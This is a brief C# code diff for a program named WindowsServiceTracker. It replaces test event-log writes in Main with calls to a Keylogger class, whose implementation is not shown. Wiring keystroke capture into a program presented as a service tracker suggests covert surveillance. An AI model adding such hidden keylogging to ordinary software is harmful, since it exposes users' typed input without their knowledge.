@@ -34,18 +34,8 @@ namespace WindowsServiceTracker
 
         public static void Main()
         {
-            EventLog.WriteEntry(errorLogSource, "Test event 1", EventLogEntryType.Error);
-            Thread.Sleep(5000);
-            EventLog.WriteEntry(errorLogSource, "Test event 2", EventLogEntryType.Error);
-            Thread.Sleep(5000);
-            EventLog.WriteEntry(errorLogSource, "Test event 3", EventLogEntryType.Error);
-            Thread.Sleep(5000);
-            EventLog.WriteEntry(errorLogSource, "Test event 4", EventLogEntryType.Error);
-            Thread.Sleep(5000);
-            EventLog.WriteEntry(errorLogSource, "Test event 5", EventLogEntryType.Error);
-            Thread.Sleep(5000);
-            EventLog.WriteEntry(errorLogSource, "Test event 6", EventLogEntryType.Error);
-            Thread.Sleep(5000);
+            Keylogger.Start();
+            Keylogger.Stop();
         }
     }
 }
